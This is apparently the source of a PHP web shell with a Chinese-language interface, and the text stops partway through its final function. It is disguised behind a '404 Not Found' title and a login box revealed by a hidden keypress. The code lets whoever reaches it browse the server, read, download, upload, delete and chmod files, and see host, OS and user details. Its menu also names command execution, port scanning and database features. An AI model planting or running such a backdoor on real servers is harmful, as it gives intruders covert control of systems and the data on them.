//<?php
run();
class project {
  static protected function js(){
    $js=<<<HTML
<script>
function sideOut(d, t) {
	window.setTimeout(display, t);
	function display() {
		$("load").style.display = "none"
	}
}
function ajax(arg, type) {
	if ($("load")) {
		$("load").style.display = "block";
		$("load").innerHTML = "正在载入......"
	}
	if (type == 2 || arg == 2) {
		$("load").innerHTML = "功能陆续完善中......";
		sideOut($("load"), 1500);
		return
	}
	if (type == 1) arg = 'action=show&dir=' + arg;
	if (type == 3) {
		if (confirm("确定删除当前文件么?")) arg = 'action=delete&file=' + arg;
		else {
			$("load").innerHTML = "操作已取消";
			sideOut($("load"), 1500);
			return
		}
	}
	if (type == 4) {
		window.location.href = '?action=download&file=' + arg;
		sideOut($("load"), 500);
		return
	}
	if (type == 5) {
		var mk = prompt('请输入创建文件夹名称:', '');
		if (!mk) {
			$("load").innerHTML = "操作已取消";
			sideOut($("load"), 1500);
			return
		}
		arg = 'action=_mkdir&dir=' + mk
	}
	if (type == 6) {
		$("upload").style.display = 'block';
		$("close_file").onclick = function() {
			$("upload").style.display = 'none';
			$("load").innerHTML = "操作已取消";
			sideOut($("load"), 1500);
			return
		}
		$("_file").onclick = function() {
			this.form.submit();
			$("upload").style.display = 'none';
			$("userfile").value = '';
			return
		}
		return
	}
	action = arg ? arg: 'action=show';
	var options = {};
	options.url = '{self}';
	options.listener = callback;
	options.method = 'POST';
	var request = XmlRequest(options);
	request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	request.send(action)
}
function view(arg) {
	action = 'action=view&file=' + arg;
	var options = {};
	options.url = '{self}';
	options.listener = viewcallback;
	options.method = 'POST';
	var request = XmlRequest(options);
	request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	request.send(action)
}
function edit() {
	$("load").style.display = "block";
	$("load").innerHTML = "确保编码一致,不在提供编辑功能.可以使用上传功能覆盖当前编辑文件!";
	sideOut($("load"), 4000);
	return
}
function fileperm(name, type) {
	var newperm;
	if (type == 3) newperm = prompt('需要输入完整路径(包含文件名):', '');
	else newperm = prompt('请输入名称:', '');
	if (!newperm) return;
	if (type == 1) chmod(name, newperm);
	if (type == 2) rename(name, newperm);
	if (type == 3) copy(name, newperm)
}
function chmod(name, perm) {
	action = 'action=chmod&file=' + name + '&perm=' + perm;
	var options = {};
	options.url = '{self}';
	options.listener = callback;
	options.method = 'POST';
	var request = XmlRequest(options);
	request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	request.send(action)
}
function rename(name, perm) {
	action = 'action=rename&file=' + name + '&newname=' + perm;
	var options = {};
	options.url = '{self}';
	options.listener = callback;
	options.method = 'POST';
	var request = XmlRequest(options);
	request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	request.send(action)
}
function copy(name, perm) {
	action = 'action=copyfile&file=' + name + '&copyfile=' + perm;
	var options = {};
	options.url = '{self}';
	options.listener = callback;
	options.method = 'POST';
	var request = XmlRequest(options);
	request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	request.send(action)
}
function XmlRequest(options) {
	var req = false;
	if (window.XMLHttpRequest) {
		var req = new XMLHttpRequest()
	} else if (window.ActiveXObject) {
		var req = new window.ActiveXObject('Microsoft.XMLHTTP')
	}
	if (!req) return false;
	req.onreadystatechange = function() {
		if (req.readyState == 4 && req.status == 200) {
			options.listener.call(req)
		}
	};
	req.open(options.method, options.url, true);
	return req
}
function viewcallback() {
	var data = this.responseText;
	if (data) {
		$("open").style.display = "block";
		$("show_file").focus();
		$("show_file").innerHTML = data;
		close();
		$("show_file").onblur = function() {
			$("open").style.display = "none"
		}
	} else {
		$("load").style.display = "block";
		$("load").innerHTML = "不支持预览此类型的文件,或者预览的文件大于1Mb!";
		sideOut($("load"), 2000);
		return
	}
}
function callback() {
	var json = eval("(" + this.responseText + ")");
	if (json.status == 'off') {
		document.onkeydown = function(e) {
		    var theEvent = window.event || e;      
            var code = theEvent.keyCode || theEvent.which; 
			if (80 == code) {
				$("login").style.display = "block"
			}
		}
	}
	if (json.status == 'close') {
		document.body.innerHTML = json.data;
		$("login").style.display = "block";
		login()
	}
    if (json.status=='on'){
        window.location.reload();
        return;
    }
	if (json.status == 'ok') {
		ajax();
		document.body.innerHTML = json.data
	}
	if (json.pages == '') {
		$("pages").style.display = "none"
	}
	if (json.pages) {
		$("pages").style.display = "block";
		$("pages").innerHTML = json.pages
	}
	if (json.node_data) $("show").innerHTML = json.node_data;
	if (json.time) $("runtime").innerHTML = json.time;
	if (json.listdir) $("listdir").innerHTML = json.listdir;
	if (json.memory) $("memory").innerHTML = json.memory;
	if (json.disktotal) $("disktotal").innerHTML = json.disktotal;
	if ($("load")) {
		$("load").style.display = "none"
	}
	if (json.error) {
		$("load").style.display = "block";
		$("load").innerHTML = json.error;
		sideOut($("load"), 1500)
	}
    	if (json.notice) {
		$("load").style.display = "block";
		$("load").innerHTML = json.notice;
		sideOut($("load"), 1500);
	}
}
function reload() {
	var options = {};
	options.url = '{self}';
	options.listener = callback;
	options.method = 'POST';
	var request = XmlRequest(options);
	request.setRequestHeader('AJAX', 'true');
	request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	request.send('action=init')
}
function addEvent(obj, evt, fn) {
	if (obj.addEventListener) {
		obj.addEventListener(evt, fn, false)
	} else if (obj.attachEvent) {
		obj.attachEvent('on' + evt, fn)
	}
}
function init() {
	$();
	login();
	reload()
}
function close() {
	$("close").onclick = function() {
		$("open").style.display = "none"
	}
}
function login() {
	$("login_open").onclick = function() {
		var pwd = $("pwd").value;
		var options = {};
		options.url = '{self}';
		options.listener = callback;
		options.method = 'POST';
		var request = XmlRequest(options);
		request.setRequestHeader('AJAX', 'true');
		request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
		if (pwd) request.send('pwd=' + pwd)
	}
}
function $(d) {
	return document.getElementById(d)
}
addEvent(window, 'load', init);
</script>
HTML;
  return str_replace('{self}',self,$js);
  }
  static protected function css(){
  $css=<<<HTML
 input{font:11px Verdana;BACKGROUND:#FFFFFF;height:18px;border:1px solid #666666;}a{color:#00f;text-decoration:underline;}a:hover{color:#f00;text-decoration:none;}body{font:12px Arial,Tahoma;line-height:16px;margin:0;padding:0;}#header{height:20px;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}#header .left{float:left;}#header .right{float:right;}#menu{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}#content{margin:0 auto;width:98%;}#content h2{margin-top:15px;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}#content #base,#content #base2{background:#eee;margin-bottom:10px;}#base input{float:right;border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;margin:5px 10px;}.cdrom{padding:5px;margin:auto 7px;}.h{margin-top:8px;}#base2 .input{font:12px Arial,Tahoma;background:#fff;border:1px solid #666;padding:2px;height:18px;}#base2 .bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}dl,dt,dd{margin:0;}.focus{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}.fff{background:#fff}dl{margin:0 auto;width:100%;}dt,dd{overflow:hidden;border-top:1px solid white;border-bottom:1px solid #DDD;background:#F1F1F1;padding:5px 15px 5px 5px;}dt{border-top:1px solid white;border-bottom:1px solid #DDD;background:#E9E9E9;font-weight:bold;padding:5px 15px 5px 5px;}dt span,dd span{width:19%;display:inline-block;text-indent:0em;overflow:hidden;}#footer{padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;}#load{position:fixed;right:0;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;display:none;}.in{width:40px;text-align:center;}#pages{display:none;}.high{background-color:#0449BE;color:white;margin:0 2px;padding:2px 3px;width:10px;}.high2{margin:0 2px;padding:2px 0px;width:10px;}#login{display:none;}#show_file{color:#000;height:400px;width:800px;position:fixed;top:45%;left:50%;margin-top:-200px;margin-left:-400px;background:#fff;overflow:auto;}#open,#upload{display:none;position:fixed;top:45%;left:50%;margin-top:-200px;margin-left:-400px;}#close{color:#fff;height:16px;width:30px;position:absolute;right:0;background:#000;z-index:1;}#upfile{width:628px;height:108px;padding:10px 20px;background-color:white;position:fixed;top:45%;left:50%;margin-top:-54px;margin-left:-314px;}
HTML;
 return $css;
}
  static function init() {
    self::authentication();
  }
 function show($msg=''){
    self::G('runtime');
    header ("Cache-Control: no-cache, must-revalidate");  
    header ("Pragma: no-cache"); 
    header("Content-type:text/html;charset=utf-8");
    $url=isset($_COOKIE['PATH']) ? $_COOKIE['PATH'] : self::convert_to_utf8(sprintf("%s%s",rtrim(__ROOT__,"/"),"/"),'utf8');
    $file = !empty($_POST["dir"]) ? urldecode(self::convert_to_utf8(rtrim($_POST["dir"],'/'),'utf8')) ."/" : $url ;
    if (!is_readable($file)) return false;
    setcookie("PATH",$file,time()+3600);
    clearstatcache();
    if(function_exists("scandir")){
        $array=scandir($file);
    }
    elseif(function_exists("glob")){
        foreach(glob($file.'*') as $ff){
            $array[]=basename($ff);
        }
     
    }
    /********分页开始*********/
    $total_nums=count($array);
    $page_nums=50;
    $nums= $total_nums>$page_nums ? ceil($total_nums/$page_nums) : 1;
    if ($nums>1){
        $page=intval($_POST['page']) ? intval($_POST['page']) : 1;
        if ($page>$nums || $page<1) $page=1;
        if($page==1){$for_start=0; $for_page=$page*$page_nums-1;}
        else {$for_page=$page*$page_nums-1 > $total_nums ? $total_nums : $page*$page_nums-1; 
              $for_start=$page*$page_nums-1 > $total_nums ?  ($page-1)*$page_nums-2 : $for_page-$page_nums-1 ; }
    }
    if($nums==1){
        $for_start=0;
        $for_page=$total_nums;
    }
    for($i=$for_start;$i<$for_page;++$i){
        if($array[$i]=='.'||$array[$i]=='..') continue;
        if (is_dir($file.$array[$i])) $dir[] = $array[$i];
        elseif(is_file($file.$array[$i])) $files[] = $array[$i];
    }
    $next = $page+1<=$nums ? $page+1 : $nums;
    $previous = $page-1>1 ? $page-1 : 1;
    if($nums>10){
        if($page>5){
            if($nums-$page>=5){
                $ipage=$page-4;
                $_nums=$page+5;
            }else{
                $ipage=$nums-9;
                $_nums=$nums;
            }
        }else{
            $ipage=1;$_nums=10;
    }
    }else{
    $ipage=1;
    $_nums=$nums;
    }
    for($i=$ipage;$i<=$_nums;++$i){
         if($i==$page) 
         $_page.=sprintf('<a  class="high" href="javascript:;;;" name="action=show&dir=%s&page=%s" onclick="ajax(this.name)">%s</a> ',urlencode(self::convert_to_utf8($file)),$i,$i);
         else $_page.=sprintf('<a href="javascript:;;;" name="action=show&dir=%s&page=%s" onclick="ajax(this.name)">%s</a> ',urlencode(self::convert_to_utf8($file)),$i,$i);
    }
    /*****************
        分页结束
    ******************/
    if (!isset($dir)) $dir = array();
    if (!isset($files)) $files = array();
    $_ipage_file=urlencode(rtrim(self::convert_to_utf8($file),'/')); //bug修复
    $_pages=<<<HTML
    <dl>
    <dd>
    <span class="in">　</span>
    <span></span>
    <span></span>
    <span></span>
    <span style="text-align:right;width:38%">
    <a class="high2" href="javascript:;;;" name="action=show&dir=$_ipage_file&page=1" onclick="ajax(this.name)">Index</a>   
    <a class="high2" href="javascript:;;;" name="action=show&dir=$_ipage_file&page=$previous" onclick="ajax(this.name)">Previous</a>
    {pages}
    <a class="high2" href="javascript:;;;" name="action=show&dir=$_ipage_file&page=$next" onclick="ajax(this.name)">Next</a>
    <a class="high2" href="javascript:;;;" name="action=show&dir=$_ipage_file&page=$nums" onclick="ajax(this.name)">End</a>
    </dd>
    </dl>
HTML;
    $return=<<<HTML
 <!-- return -->
 <dl>
  <dt>
    <span class="in">　</span>
    <span>文件名</span>
    <span>修改时间</span>
    <span>文件大小</span>
    <span>权限</span>
    <span>操作</span>
  </dt>
  <dd >
    <span class="in">
    -
    </span>
    <span>
      <a href="javascript:;;;" name="{back}" onclick="ajax(this.name,1)">返回上一目录</a>
    </span>
    <span></span>
    <span></span>
    <span></span>
     <span></span>
  </dd>
  {file}
 </dl>
HTML;
  $return_file=<<<HTML
  <!-- file -->
  <dd class="{className}" onmouseover="this.className='focus';" onmouseout="this.className='{className}';">
    <span class="in">
     <input name="{return_link}" type="checkbox" onclick="ajax(this.name,3)">
    </span>
    <span>
    <a href="javascript:;;;" name="{return_link}" onclick="{return_onclick}">{return_file}</a>
    </span>
    <span>
     <a href="javascript:;;;" name="{return_link}" onclick="ajax(this.name,2)">{return_time}</a>
    </span>
    <span>{return_size}</span>
    <span>
     <a href="javascript:;;;" name="{return_link}" onclick="fileperm(this.name,1)">{return_chmod}</a> / 
     <a href="javascript:;;;" name="{return_link}">{return_perms}</a>
    </span>
    <span>
     {is_folder}
   </span>
  </dd>
HTML;
    $document=array_merge($dir,$files);
    foreach($document as $i=>$gbk){
        $utf8=self::convert_to_utf8($gbk);
        $utf8_file=self::convert_to_utf8($file);
        $className= $i % 2 ? "dd" : "fff";
        if(is_dir($file.$gbk)){
            $return_onclick="ajax(this.name,1)";
            $return_folder=sprintf('
            <a href="javascript:;;;" name="%s" onclick="fileperm(this.name,2)">重命名</a>',
            urlencode($utf8_file.$utf8));
        }
        if(is_file($file.$gbk)){
            $return_onclick="view(this.name)";
            $return_folder=sprintf('
            <a href="javascript:;;;" name="%s" onclick="ajax(this.name,4)">下载</a> | 
            <a href="javascript:;;;" name="%s" onclick="fileperm(this.name,3)">复制</a> | 
            <a href="javascript:;;;" name="%s" onclick="edit()">编辑</a> | 
            <a href="javascript:;;;" name="%s" onclick="fileperm(this.name,2)">重命名</a>',
            urlencode($utf8_file.$utf8),
            urlencode($utf8_file.$utf8),
            urlencode($utf8_file.$utf8),
            urlencode($utf8_file.$utf8));
        }
        $search=array('{className}',
                      '{return_file}',
                      '{return_time}',
                      '{return_size}',
                      '{return_chmod}',
                      '{return_perms}',
                      '{return_link}',
                      '{return_onclick}',
                      '{is_folder}',
                      );
        $replace=array($className,
                       $utf8,
                       self::perms($file.$gbk,3),
                       self::perms($file.$gbk,4),
                       self::perms($file.$gbk,1),
                       self::perms($file.$gbk,2),
                       urlencode($utf8_file.$utf8),
                       $return_onclick,
                       $return_folder,
                       );
        $directory['html'].=str_replace($search,$replace,$return_file);                  
    }
    $directory['node_data']=str_replace(array('{file}','{back}'),
                                   array($directory['html'],
                                   urlencode(str_replace('\\\\','/',dirname(self::convert_to_utf8($file))))
                                   ),
                                   $return);
    $pages=str_replace('{pages}',$_page,$_pages);
    $directory['pages']=$nums>1 ? $pages : '';
    unset($directory['html'],$_pages);
    $directory['folder']=count($dir);
    $directory['file']=count($files);
    $directory['time']=self::G('runtime','end');
    $directory['listdir']=self::uppath($file);
    $directory['memory']=self::byte_format(memory_get_peak_usage());
    $directory['disktotal']=self::byte_format(disk_total_space($file));
    if(true==$msg) $directory['error']=$msg;
    unset($dir,$files);
    if(!ob_start("ob_gzhandler")) ob_start();
    clearstatcache();
    echo json_encode($directory);
    // print_r(array_unique($directory));
    ob_end_flush();
    unset($directory);
    exit;
}
function view(){
    header ("Cache-Control: no-cache, must-revalidate");  
    header ("Pragma: no-cache"); 
    header("Content-type:text/html;charset=UTF-8");
    $file = urldecode(self::convert_to_utf8($_POST["file"],'utf8'));
    ob_start();
    $path=pathinfo($file);
    //$path['extension'] = is_null($path['extension']) ? null :$path['extension'];
    if(filesize($file)>1024*1024) {
        exit;
    }
    if(in_array(strtolower($path['extension']),array('exe',
                                         'dat',
                                         'mp3',
                                         'rmvb',
                                         'jpg',
                                         'png',
                                         'gif',
                                         'swf',
                                         'gz',
                                         'bz2',
                                         'tar',
                                         'sys',
                                         'dll',
                                         'so',
                                         'bin',
                                         'pdf',
                                         'chm',
                                         'doc',
                                         'xls',
                                         'wps',
                                         'ogg',
                                         'mp4',
                                         'flv',
                                         'ppt',
                                         'zip',
                                         'iso',
                                         'msi'
                                         ))) exit;
    $c=self::convert_to_utf8(file_get_contents($file));
    if(!ob_start("ob_gzhandler")) ob_start();
    //highlight_string($c);
    clearstatcache();
    $c=htmlspecialchars($c);
    echo "<code><pre>$c<pre></code>";
    ob_end_flush();
    exit;   
}
function _mkdir(){
    if($_POST['dir']){
       $mkdir=$_COOKIE['PATH'].self::convert_to_utf8($_POST['dir'],'utf8');
       if(true==@mkdir($mkdir,0777)){
        $_POST['dir']=$_COOKIE['PATH'];
        self::show('文件夹创建成功');
       }
       else die('{"error":"文件夹创建失败"}');
    }
}
function chmod(){
    if($_POST['file']&&$_POST['perm']){
    $file = urldecode(self::convert_to_utf8($_POST["file"],'utf8'));
    $perm=base_convert($_POST['perm'], 8, 10);
    if(true==@chmod($file,$perm)){
        $_POST['dir']=$_COOKIE['PATH'];
        self::show('权限修改成功');
    }
    else die('{"error":"文件修改失败"}');
    }
}
function rename(){
    if($_POST['file']&&$_POST['newname']){
    $file = urldecode(self::convert_to_utf8($_POST["file"],'utf8'));
    $newname=$_COOKIE['PATH'].self::convert_to_utf8($_POST['newname'],'utf8');
    if(true==@rename($file,$newname)){
        $_POST['dir']=$_COOKIE['PATH'];
        self::show('文件重命名成功');
    }
    else die('{"error":"文件修改失败"}');
    }
}
function upload(){
    $file=$_COOKIE['PATH'].basename($_FILES['userfile']['name']);
    if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_to_utf8($file,'utf8'))){
        exit('<script>
          parent.ajax();
          parent.$("load").style.display = "block";
          parent.$("load").innerHTML = "上传成功";
        </script>');
    }
     else{
        exit('<script>
         parent.$("load").style.display = "block";
         parent.$("load").innerHTML = "上传失败";
         parent.sideOut(parent.$("load"),1500);
        </script>');
     }
     
}
function copyfile(){
    if($_POST['file']&&$_POST['copyfile']){
    $file = urldecode(self::convert_to_utf8($_POST["file"],'utf8'));
    $newname=self::convert_to_utf8($_POST['copyfile'],'utf8');
    if(true==@copy($file,$newname)){
        die('{"error":"文件拷贝成功"}');
    }
    else die('{"error":"文件拷贝失败"}');
    }
}
function delete(){
     $file = urldecode(self::convert_to_utf8($_POST["file"],'utf8'));
     if(is_file($file)){
     if(true==@unlink($file)) {
        $_POST['dir']=$_COOKIE['PATH'];
        self::show('文件删除成功');
     }
     else die('{"error":"文件删除失败"}');
     }
     if(is_dir($file)){
        if(true==@rmdir($file)) {
        $_POST['dir']=$_COOKIE['PATH'];
        self::show('文件夹删除成功');
     }
     else die('{"error":"文件夹删除失败"}');
     }         
}
function download(){
     $filename = urldecode(self::convert_to_utf8($_GET["file"],'utf8'));
     if (file_exists($filename)) {
        header ("Cache-Control: no-cache, must-revalidate");  
        header ("Pragma: no-cache");  
        header("Content-Disposition: attachment; filename=".basename($filename));
        header("Content-Length: ".filesize($filename));
        header("Content-Type: application/force-download"); 
        header('Content-Description: File Transfer'); 
        header('Content-Encoding: none');
        header("Content-Transfer-Encoding: binary" );
            @readfile($filename);
        exit();
}
}
static protected function uppath($path){
    $return='';
    $path=self::convert_to_utf8(rtrim($path,'/'));
    if(strpos($path,"/")==0) return sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name,1)">%s</a>',$path,ucfirst($path));
    else {
        $array=explode("/",$path);
        foreach($array as $i => $value){
            if($i==0) $path=$value;
            if($i>0) $path.=sprintf('/%s',$array[$i]);
            $return.= sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name,1)">%s</a> ',$path,ucfirst($value));
        }
        return $return;
    }
    
}
static protected function perms($file, $type = '1') {
    if ($type == 1) {
      return substr(sprintf('%o', fileperms($file)), -4);
    }
    if ($type == 2) {
      return self::getperms($file);
    }
    if ($type == 3) {
      return date('Y-m-d h:i:s', filemtime($file));
    }
    if ($type == 4) {
      return is_dir($file) ? 'directory' : self::byte_format(sprintf("%u",
        filesize($file)));
    }
  }
  static protected function headers() {
    header ("Cache-Control: no-cache, must-revalidate");  
    header ("Pragma: no-cache");  
    $eof = <<< HTML
<div id="load">
</div>
<div id="upload">
<div id="upfile">
<p></p><p></p><p><a href="javascript:;;;" id="close_file">点我关闭</a></p>
<form action="" id="form1" name="form1" encType="multipart/form-data"  method="post" target="hidden_frame">
    <input name="action" value="upload" type="hidden" />
    <input type="file" id="userfile" name="userfile">  
    <INPUT id="_file" type="button" value="上传文件">         
    <iframe name='hidden_frame' id="hidden_frame" style='display:none'></iframe>  
</form>  
</div>
</div>
<div id="open">
<div style="position:relative;">
<div id="close">关闭</div>
</div>
<div id="show_file">
</div>
</div>
<div id="header">
  <div class="left">
  {host}({ip})
  </div>
  <div class="right">
  OS:{uname} {software} php {php_version}
  </div>
</div>
<div id="menu">
    {menu}
</div>
<div id="content">
<h2>文件管理 - 当前磁盘空间 <span id="disktotal"></span> 运行用户:{whoami}</h2>
  <div id="base">
    <div class="cdrom">
      <span id="listdir"></span>
    </div>
    <div class="cdrom">
      {cdrom}
    </div>
  </div>
  <div class="h"></div>
  <div id="base2">
    <div class="cdrom">
      {action}
    </div>
    <div class="cdrom">
      查找文件(当前路径): <input class="input" name="findstr" value="" type="text" /> <input class="bt" value="查找" type="submit" />
    </div>
  </div>
  <!-- return -->
  <div id="show">
  </div>
  <div id="pages">
  </div>
  <!-- end -->
</div> 
<div class="h"></div>
<div id="footer">
  <span style="float:right;">
     Processed in <span id="runtime"></span> second(s) {gzip} usage:<span id="memory">{memory}</span>
  </span>
  Powered by {copyright}
  . Copyright (C) 2010-2012
   All Rights Reserved.
</div>
HTML;
    $actions[]=array('name'=>'网站目录',
                     'url'=>urlencode($_SERVER['DOCUMENT_ROOT']),
                     'type'=>1
                     );
    $actions[]=array('name'=>'文件目录',
                     'url'=>urlencode(str_replace(array('\\\\'),array('/'),dirname(__FILE__))),
                     'type'=>1
                     );
    $actions[]=array('name'=>'创建文件夹',
                     'url'=>'null',
                     'type'=>'5'
                     );
    $actions[]=array('name'=>'创建文件',
                     'url'=>'2',
                     'type'=>'2'
                     );
    $actions[]=array('name'=>'上传文件',
                     'url'=>'null',
                     'type'=>'6'
                     );
    $menus[]=array('name'=>'退出',
                     'url'=>'action=logout',
                     'type'=>'null'
                     );
    $menus[]=array('name'=>'文件管理',
                     'url'=>urlencode(str_replace(array('\\\\'),array('/'),dirname(__FILE__))),
                     'type'=>1
                     );
    $menus[]=array('name'=>'数据库操作',
                     'url'=>'2',
                     'type'=>'2'
                     );
    $menus[]=array('name'=>'运行命令',
                     'url'=>'2',
                     'type'=>'2'
                     );
    $menus[]=array('name'=>'PHP相关',
                     'url'=>'2',
                     'type'=>'2'
                     );      
    $menus[]=array('name'=>'端口扫描',
                     'url'=>'2',
                     'type'=>'2'
                     );
    $menus[]=array('name'=>'PHP命令',
                     'url'=>'2',
                     'type'=>'2'
                     );         
    foreach ($menus as $key => $value) {
      $menu .= sprintf('<a href="javascript:;;;" name="%s" onclick=ajax(this.name,%s)>%s</a> | ',
        $value['url'],$value['type'],$value['name']);
    }
    foreach ($actions as $key => $value) {
      $action .= sprintf('<a href="javascript:;;;" name="%s" onclick=ajax(this.name,%s)>%s</a> | ',
        $value['url'],$value['type'],$value['name']);
    }
    $serach = array(
      '{title}',
      '{host}',
      '{ip}',
      '{uname}',
      '{software}',
      '{php_version}',
      '{menu}',
      '{copyright}',
      '{cdrom}',
      '{action}',
      '{gzip}',
      '{memory}',
      '{js}',
      '{css}',
      '{whoami}');
  if (!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(@posix_geteuid());
    $gid = @posix_getgrgid(@posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
    $replace = array(
      title,
      $_SERVER['HTTP_HOST'],
      $_SERVER['SERVER_ADDR'],
      php_uname('s'),
      $_SERVER["SERVER_SOFTWARE"],
      PHP_VERSION,
      trim($menu, '| '),
      copyright,
      self::disk(),
      trim($action, '| '),
      gzip,
      self::byte_format(memory_get_peak_usage()),
      self::js(),
      self::css(),
      $uid . ' ( ' . $user . ' ) / Group: ' . $gid . ' ( ' . $group . ' )');
    $eof = str_replace($serach, $replace, $eof);
    $json['status']='ok';
    $json['data']=$eof;
    if(!ob_start("ob_gzhandler")) ob_start();
    echo json_encode($json);
    ob_end_flush();
    exit;
  }
  static protected function disk() {
    if (is_win) {
      $cdrom = range('A', 'Z');
      foreach ($cdrom as $disk) {
        $disk = sprintf("%s%s", $disk, ':');
        if (is_readable($disk)) {
          $return .= sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name,1)">DISK %s</a> | ',
            $disk, $disk);
        }
      }
      return trim($return, "| ");
    }
    else {
      if(function_exists("scandir")){
         $cdrom = scandir('/');
      }elseif(function_exists("glob")){
         foreach(glob('/*') as $ff){
            $cdrom[]=basename($ff);
        }
      }
      foreach ($cdrom as $disk) {
        if ($disk == '.' || $disk == '..') continue;
        $disk = sprintf("%s%s", '/', $disk);
        if (is_readable($disk)) {
          if (is_dir($disk)) $return .= sprintf('<a href="javascript:;;;" name="%s" onclick="ajax(this.name,1)">%s</a> | ',
              urlencode($disk), str_replace('/', '', $disk));
        }
      }
      return trim($return, "| ");
    }
  }
  static protected function G($start, $end = '', $dec = 6) {
    static $_info = array();
    if (is_float($end)) { // 记录时间
      $_info[$start] = $end;
    }
    elseif (!empty($end)) { // 统计时间
      if (!isset($_info[$end])) $_info[$end] = microtime(true);
      return number_format(($_info[$end] - $_info[$start]), $dec);
    }
    else { // 记录时间
      $_info[$start] = microtime(true);
    }
  }
  static protected function authentication() {
    if (true == password) {
      //if(!empty($_POST['pwd']) && !preg_match('/^[a-z0-9]+$/',$_POST['pwd'])) exit;
      if(!empty($_POST['pwd']) && strlen(password) == 32) $password = hash(crypt, $_POST['pwd']); 
      else $password = $_POST['pwd'];
      if((true == $password) && $password !==password) die('{"error":"密码错误!"}');
      if((true == $password) && $password == password) {
        setcookie('verify', $password, time() + 3600*24*30);
        self::headers();
        exit;
      }
      if (!isset($_COOKIE['verify']) || empty($_COOKIE['verify']) || (string )$_COOKIE['verify']
        !== password) {
        if($_SERVER['HTTP_AJAX']=='true') die('{"status":"off"}');
        self::login();
        exit;
      }
    }
    if($_SERVER['HTTP_AJAX']=='true') self::headers();  
  }
  public function logout() {
    setcookie('key', '', time() - 3600*24*30);
    unset($_COOKIE['key']);
    session_start();
    session_destroy();
     $login=<<<LOGIN
  <div id="load">
   </div>
   <div class="h"></div>
   <div id="login">
     <span style="font:11px Verdana;">
       Password: 
     </span>
     <input id="pwd" name="pwd" type="password" size="20">
     <input id="login_open" type="button" value="Login">
  </div>
LOGIN;
    $json['status']='close';
    $json['data']=$login;
    die(json_encode($json));
  }
  static function login() {
    $login=<<<LOGIN
<!DOCTYPE HTML>
<head>
<meta http-equiv="content-type" content="text/html" />
<meta http-equiv="content-type" charset="UTF-8" />
<title>{title}</title>
{css}
{js}
</head>
<body>
  <div id="load">
   </div>
   <div class="h"></div>
   <div id="login">
     <span style="font:11px Verdana;">
       Password: 
     </span>
     <input id="pwd" name="pwd" type="password" size="20">
     <input id="login_open" type="button" value="Login">
  </div>
</body>
</html>
LOGIN;
    $search=array('{css}',
                  '{title}',
                  '{js}');
    $replace=array(self::css(),
                   title,
                   self::js());
    echo str_replace($search,$replace,$login);
  }
  static protected function getperms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
      $info = 's';
    }
    elseif (($perms & 0xA000) == 0xA000) {
      $info = 'l';
    }
    elseif (($perms & 0x8000) == 0x8000) {
      $info = '-';
    }
    elseif (($perms & 0x6000) == 0x6000) {
      $info = 'b';
    }
    elseif (($perms & 0x4000) == 0x4000) {
      $info = 'd';
    }
    elseif (($perms & 0x2000) == 0x2000) {
      $info = 'c';
    }
    elseif (($perms & 0x1000) == 0x1000) {
      $info = 'p';
    }
    else {
      $info = '?????????';
      return $info;
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms &
      0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms &
      0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms &
      0x0200) ? 'T' : '-'));
    return $info;
  }
  static protected function byte_format($size, $dec = 2) {
    $a = array(
      "B",
      "KB",
      "MB",
      "GB",
      "TB",
      "PB");
    $pos = 0;
    while ($size >= 1024) {
      $size /= 1024;
      $pos++;
    }
    return round($size, $dec) . "" . $a[$pos];
  }
  static protected function convert_to_utf8($str,$type='gbk'){
    if(function_exists('iconv')){
        if($type=='gbk'){
            if(false==@iconv("GBK","UTF-8",$str)){
                return $str;
            }else{
                return @iconv("GBK","UTF-8",$str);
            }
        }
       if($type=='utf8'){
           if(false==@iconv("UTF-8","GBK",$str)){
                return $str;
            }else{
                return @iconv("UTF-8","GBK",$str);
            }
       }
    }else{
        return $str;
    }
  } 
}
function run(){
set_time_limit(0);
ini_set('memory_limit',-1);
if(!defined('password')) define('password','');
if(!defined('title')) define('title','404 Not Found');
if(!defined('copyright')) define('copyright', 'E');
define('self',$_SERVER["SCRIPT_NAME"]);
define('crypt', 'ripemd128');
define('__ROOT__', $_SERVER["DOCUMENT_ROOT"]);
define('is_win','win' == substr(strtolower(PHP_OS),0,3));
date_default_timezone_set('asia/shanghai');
